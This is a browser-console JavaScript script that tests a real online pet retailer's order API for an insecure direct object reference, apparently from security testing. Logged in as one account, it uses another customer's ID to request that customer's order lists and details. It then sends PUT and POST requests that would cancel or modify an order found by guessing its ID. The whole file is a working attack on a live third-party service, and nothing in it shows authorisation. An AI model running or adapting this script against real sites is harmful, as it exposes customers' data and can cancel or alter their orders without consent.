// Test Order Modification IDOR
// Execute in browser console while logged in as Account B

(async function () {
  console.log("[*] ========================================");
  console.log("[*] TESTING ORDER MODIFICATION IDOR");
  console.log("[*] ========================================");

  // First, try to get orders for Account A
  // We know customerId: 53260509 from cart read
  const customerId = 53260509; // Account A's customer ID

  const orderTests = [
    // Get orders by customer ID
    {
      name: "Get Orders by Customer ID",
      url: `https://www.zooplus.de/api/orders?customerId=${customerId}`,
      method: "GET",
    },
    // Get orders (alternative)
    {
      name: "Get Orders (alt)",
      url: `https://www.zooplus.de/myaccount/api/orders?customerId=${customerId}`,
      method: "GET",
    },
    // Get order details
    {
      name: "Get Order Details",
      url: `https://www.zooplus.de/api/order/12345`, // Try common order ID
      method: "GET",
    },
    // Modify order
    {
      name: "Modify Order",
      url: `https://www.zooplus.de/api/order/12345`,
      method: "PUT",
      body: JSON.stringify({ status: "cancelled" }),
    },
    // Cancel order
    {
      name: "Cancel Order",
      url: `https://www.zooplus.de/api/order/12345/cancel`,
      method: "POST",
    },
  ];

  for (const test of orderTests) {
    console.log(`\n[*] Testing: ${test.name}`);
    try {
      const response = await fetch(test.url, {
        method: test.method,
        credentials: "include",
        headers: test.body
          ? {
              "Content-Type": "application/json",
              Accept: "application/json",
            }
          : { Accept: "application/json" },
        body: test.body,
      });

      const text = await response.text();
      console.log(`    Status: ${response.status}`);

      if (response.status === 200 || response.status === 201) {
        try {
          const json = JSON.parse(text);
          console.log(`    [!!!] SUCCESS - ${test.name} works!`);
          console.log(`    Response:`, JSON.stringify(json, null, 2).substring(0, 500));
        } catch (e) {
          console.log(`    Response: ${text.substring(0, 300)}`);
        }
      } else if (response.status === 403) {
        console.log(`    [*] Protected (403)`);
      } else if (response.status === 404) {
        console.log(`    [*] Not found (404)`);
      } else {
        console.log(`    Response: ${text.substring(0, 200)}`);
      }
    } catch (e) {
      console.log(`    Error: ${e.message}`);
    }
  }

  console.log("\n[*] ========================================");
  console.log("[*] ORDER MODIFICATION TESTING COMPLETE");
  console.log("[*] ========================================");
})();





